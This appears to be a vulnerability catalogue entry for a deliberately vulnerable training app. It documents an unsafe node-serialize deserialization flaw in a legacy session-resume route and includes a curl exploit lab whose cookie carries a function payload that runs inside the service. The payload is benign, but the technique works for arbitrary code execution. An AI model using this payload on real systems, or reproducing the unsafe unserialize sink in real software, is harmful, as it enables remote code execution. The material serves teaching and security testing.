# `DESER` — unsafe deserialization

The legacy "remember me" resume of `accounts`. Reproductions run against the accounts relay, `RELAY` (`http://127.0.0.1:4111` on the builder's port set; `3201` on the defaults).

## DESER-001 — the remember cookie goes to `node-serialize`

### DESER-001 — agent reference

| | |
| --- | --- |
| Operation | REST `POST /internal/sessions/resume-legacy` |
| Sink | `serialize.unserialize(cookieValue)`, in `apps/accounts/src/legacy/legacy-sessions.controller.ts` (the `node-serialize` 0.0.4 pin) |
| Flow | the `vcx_remember` cookie → parsed by `node-serialize` → a `_$$ND_FUNC$$_` value becomes a function and runs, in the service's process |
| Counterparts | `apps/accounts/src/auth/auth.controller.ts` (`resume`: a signed cookie, `JSON.parse`, then a DTO; `introspect`: the session record decides) |
| Tests | `apps/accounts/test/scenarios/auth.int-spec.ts` |
| Expected finding | Yes, CWE-502, SAST and SCA (the `node-serialize` 0.0.4 pin) |

### DESER-001 — student guide

`node-serialize`'s format can carry functions: the marker `_$$ND_FUNC$$_` turns the string that follows into executable code when the value is unserialized. The legacy resume route hands the cookie to it unchanged, so the cookie's author chooses what runs.

### DESER-001 — exploit lab

```console
$ curl -s -i $RELAY/internal/sessions/resume-legacy \
    --cookie 'vcx_remember={"userId":"u-alice","theme":"_$$ND_FUNC$$_function(){return '\''zazzles-lab-marker'\''}()"}'
HTTP/1.1 200 OK
{"status":"resumed","userId":"u-alice","theme":"zazzles-lab-marker"}
```

The theme in the answer is what the function *returned*: the function ran inside the service. The same cookie to the protected resume:

```console
$ curl -s -o /dev/null -w '%{http_code}\n' $RELAY/internal/sessions/resume \
    --cookie 'vcx_remember={"userId":"u-alice","theme":"_$$ND_FUNC$$_function(){return '\''zazzles-lab-marker'\''}()"}'
400
```

The signature is checked before anything is parsed, and this value was never signed. In Burp: the same cookie header against both routes.

### DESER-001 — vulnerable and protected

| | Why |
| --- | --- |
| `POST /internal/sessions/resume-legacy` (vulnerable) | The cookie value is unserialized by a format that executes `_$$ND_FUNC$$_` values |
| `POST /internal/sessions/resume` (protected) | The cookie is signed by the service first, then `JSON.parse`d, then validated against a DTO: this payload fails at the signature |
| `introspect` (protected) | No cookie decides anything: the session record named by the token does |

### DESER-001 — tests

`apps/accounts/test/scenarios/auth.int-spec.ts`, `DESER-001`: the function in the cookie runs and its return value is answered; the signed resume route refuses the same cookie with 400; `introspect` answers by the session record alone.
